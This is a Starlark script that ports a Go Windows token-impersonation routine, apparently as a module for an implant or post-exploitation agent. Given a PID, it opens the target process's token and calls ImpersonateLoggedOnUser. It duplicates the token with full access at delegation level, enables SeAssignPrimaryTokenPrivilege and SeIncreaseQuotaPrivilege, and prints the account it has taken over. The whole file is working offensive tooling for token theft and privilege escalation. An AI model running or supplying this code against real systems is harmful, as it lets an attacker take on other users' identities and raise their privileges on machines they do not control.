# Starlark translation of the impersonation chain from priv_windows.go
#
# Takes a single PID and executes:
#   getPrimaryToken(pid)
#   impersonateProcess(pid) → ImpersonateLoggedOnUser + DuplicateTokenEx
#   enableCurrentThreadPrivilege (x2 required privs)
#
# Parameter: args[0] = pid (integer)

# ── Windows constants ─────────────────────────────────────────────────────────
PROCESS_QUERY_INFORMATION = 0x0400
TOKEN_DUPLICATE = 0x0002
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_QUERY = 0x0008
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ALL_ACCESS = 0x000F01FF
SecurityDelegation = 3
TokenPrimary = 1
SE_PRIVILEGE_ENABLED = 0x00000002


# ── Memory helpers ────────────────────────────────────────────────────────────
def read_ptr(addr, offset):
    d = win_read_mem(addr + offset, 8)
    return (
        d[0]
        | (d[1] << 8)
        | (d[2] << 16)
        | (d[3] << 24)
        | (d[4] << 32)
        | (d[5] << 40)
        | (d[6] << 48)
        | (d[7] << 56)
    )


def read_uint32(addr, offset):
    d = win_read_mem(addr + offset, 4)
    return d[0] | (d[1] << 8) | (d[2] << 16) | (d[3] << 24)


def read_wstring(ptr):
    result = ""
    for i in range(512):
        d = win_read_mem(ptr + i * 2, 2)
        c = d[0] | (d[1] << 8)
        if c == 0:
            break
        result += chr(c)
    return result


def write_byte(addr, offset, val):
    win_call("msvcrt.dll", "memset", addr + offset, val & 0xFF, 1)


def write_uint32(addr, offset, val):
    write_byte(addr, offset, val & 0xFF)
    write_byte(addr, offset + 1, (val >> 8) & 0xFF)
    write_byte(addr, offset + 2, (val >> 16) & 0xFF)
    write_byte(addr, offset + 3, (val >> 24) & 0xFF)


def utf16_ptr(s):
    p = win_alloc((len(s) + 1) * 2)
    for i in range(len(s)):
        c = ord(s[i : i + 1])
        write_byte(p, i * 2, c & 0xFF)
        write_byte(p, i * 2 + 1, (c >> 8) & 0xFF)
    write_byte(p, len(s) * 2, 0)
    write_byte(p, len(s) * 2 + 1, 0)
    return p


# ── Token owner (for display only) ───────────────────────────────────────────
def token_owner(h_token):
    TokenUser = 1
    sz_ptr = win_alloc(4)
    win_call("advapi32.dll", "GetTokenInformation", h_token, TokenUser, 0, 0, sz_ptr)
    sz = read_uint32(sz_ptr, 0)
    win_free(sz_ptr)
    if sz == 0:
        return "unknown"
    buf = win_alloc(sz)
    sz_ptr2 = win_alloc(4)
    win_call(
        "advapi32.dll", "GetTokenInformation", h_token, TokenUser, buf, sz, sz_ptr2
    )
    win_free(sz_ptr2)
    sid_ptr = read_ptr(buf, 0)
    cn = win_alloc(4)
    dn = win_alloc(4)
    use = win_alloc(4)
    win_call("advapi32.dll", "LookupAccountSidW", 0, sid_ptr, 0, cn, 0, dn, use)
    ns = read_uint32(cn, 0)
    ds = read_uint32(dn, 0)
    if ns == 0:
        ns = 256
    if ds == 0:
        ds = 256
    nb = win_alloc(ns * 2)
    db2 = win_alloc(ds * 2)
    win_call("advapi32.dll", "LookupAccountSidW", 0, sid_ptr, nb, cn, db2, dn, use)
    acct = read_wstring(nb)
    dom = read_wstring(db2)
    win_free(cn)
    win_free(dn)
    win_free(use)
    win_free(nb)
    win_free(db2)
    win_free(buf)
    return dom + "\\" + acct


# ─────────────────────────────────────────────────────────────────────────────
# func getPrimaryToken(pid uint32) (*windows.Token, error)
# ─────────────────────────────────────────────────────────────────────────────
def getPrimaryToken(pid):
    # handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
    res = win_call("kernel32.dll", "OpenProcess", PROCESS_QUERY_INFORMATION, 1, pid)
    handle = res["r1"]
    if handle == 0:
        err_code = res.get("err_code", 0)
        err_msg = res.get("error", "")
        print("[-] OpenProcess failed for PID %d. Error %d: %s" % (pid, err_code, err_msg))
        return 0

    # var token windows.Token
    token_ptr = win_alloc(8)

    # err = windows.OpenProcessToken(handle,
    #   windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &token)
    res = win_call(
        "advapi32.dll",
        "OpenProcessToken",
        handle,
        TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
        token_ptr,
    )

    # defer windows.CloseHandle(handle)
    win_call("kernel32.dll", "CloseHandle", handle)

    if res["r1"] == 0:
        err_code = res.get("err_code", 0)
        err_msg = res.get("error", "")
        print("[-] OpenProcessToken failed for PID %d. Error %d: %s" % (pid, err_code, err_msg))
        win_free(token_ptr)
        return 0

    token = read_ptr(token_ptr, 0)
    win_free(token_ptr)
    return token


# ─────────────────────────────────────────────────────────────────────────────
# func enableCurrentThreadPrivilege(privilegeName string) error
# ─────────────────────────────────────────────────────────────────────────────
def enableCurrentThreadPrivilege(privilegeName):
    # ct, err := windows.GetCurrentThread()
    ct = win_call("kernel32.dll", "GetCurrentThread")["r1"]

    # var t windows.Token
    t_ptr = win_alloc(8)

    # err = windows.OpenThreadToken(ct, windows.TOKEN_QUERY|windows.TOKEN_ADJUST_PRIVILEGES, true, &t)
    res = win_call(
        "advapi32.dll",
        "OpenThreadToken",
        ct,
        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
        1,
        t_ptr,
    )
    if res["r1"] == 0:
        win_free(t_ptr)
        return False

    t = read_ptr(t_ptr, 0)
    win_free(t_ptr)

    # var tp windows.Tokenprivileges
    tp = win_alloc(24)  # PrivilegeCount(4)+pad(4)+Luid(8)+Attributes(4)

    # privStr, err := windows.UTF16PtrFromString(privilegeName)
    privStr = utf16_ptr(privilegeName)

    # err = windows.LookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
    res = win_call("advapi32.dll", "LookupPrivilegeValueW", 0, privStr, tp + 8)
    win_free(privStr)
    if res["r1"] == 0:
        win_free(tp)
        # defer windows.CloseHandle(windows.Handle(t))
        win_call("kernel32.dll", "CloseHandle", t)
        return False

    # tp.PrivilegeCount = 1
    write_uint32(tp, 0, 1)
    write_uint32(tp, 4, 0)
    # tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
    write_uint32(tp, 16, SE_PRIVILEGE_ENABLED)

    # return windows.AdjustTokenPrivileges(t, false, &tp, 0, nil, nil)
    res = win_call("advapi32.dll", "AdjustTokenPrivileges", t, 0, tp, 0, 0, 0)
    win_free(tp)
    # defer windows.CloseHandle(windows.Handle(t))
    win_call("kernel32.dll", "CloseHandle", t)
    return res["r1"] != 0


# ─────────────────────────────────────────────────────────────────────────────
# func impersonateProcess(pid uint32) (newToken windows.Token, err error)
# ─────────────────────────────────────────────────────────────────────────────
def impersonateProcess(pid):
    # var attr windows.SecurityAttributes  (pass NULL)
    # requiredPrivileges := []string{"SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"}
    requiredPrivileges = ["SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"]

    # primaryToken, err := getPrimaryToken(pid)
    primaryToken = getPrimaryToken(pid)
    if primaryToken == 0:
        return 0

    # err = syscalls.ImpersonateLoggedOnUser(*primaryToken)
    res = win_call("advapi32.dll", "ImpersonateLoggedOnUser", primaryToken)
    if res["r1"] == 0:
        err_code = res.get("err_code", 0)
        err_msg = res.get("error", "")
        print("[-] ImpersonateLoggedOnUser failed. Error %d: %s" % (err_code, err_msg))
        # defer primaryToken.Close()
        win_call("kernel32.dll", "CloseHandle", primaryToken)
        return 0

    # var newToken windows.Token
    newToken_ptr = win_alloc(8)

    # err = windows.DuplicateTokenEx(*primaryToken, windows.TOKEN_ALL_ACCESS, &attr,
    #     windows.SecurityDelegation, windows.TokenPrimary, &newToken)
    res = win_call(
        "advapi32.dll",
        "DuplicateTokenEx",
        primaryToken,
        TOKEN_ALL_ACCESS,
        0,
        SecurityDelegation,
        TokenPrimary,
        newToken_ptr,
    )

    # defer primaryToken.Close()
    win_call("kernel32.dll", "CloseHandle", primaryToken)

    if res["r1"] == 0:
        err_code = res.get("err_code", 0)
        err_msg = res.get("error", "")
        print("[-] DuplicateTokenEx failed. Error %d: %s" % (err_code, err_msg))
        win_free(newToken_ptr)
        return 0

    newToken = read_ptr(newToken_ptr, 0)
    win_free(newToken_ptr)

    # for _, priv := range requiredPrivileges { err = enableCurrentThreadPrivilege(priv) }
    for i in range(len(requiredPrivileges)):
        priv = requiredPrivileges[i]
        if not enableCurrentThreadPrivilege(priv):
            print("[-] Failed to enable: " + priv)
            win_call("kernel32.dll", "CloseHandle", newToken)
            return 0

    return newToken


# ── Entry point ───────────────────────────────────────────────────────────────
def main(*args):
    if len(args) == 0 or not args[0]:
        print("[-] Usage: impersonate <pid>")
        return

    pid = int(args[0])
    print("[*] impersonateProcess(pid=%d)" % pid)

    tok = impersonateProcess(pid)
    if tok == 0:
        print("[-] Impersonation failed for PID %d" % pid)
        return

    owner = token_owner(tok)
    print("[+] Impersonating PID %d as: %s" % (pid, owner))
    # CurrentToken = tok  (agent stores this; we close the handle here as the
    # thread-level impersonation context persists independently of the handle)
    win_call("kernel32.dll", "CloseHandle", tok)


main()
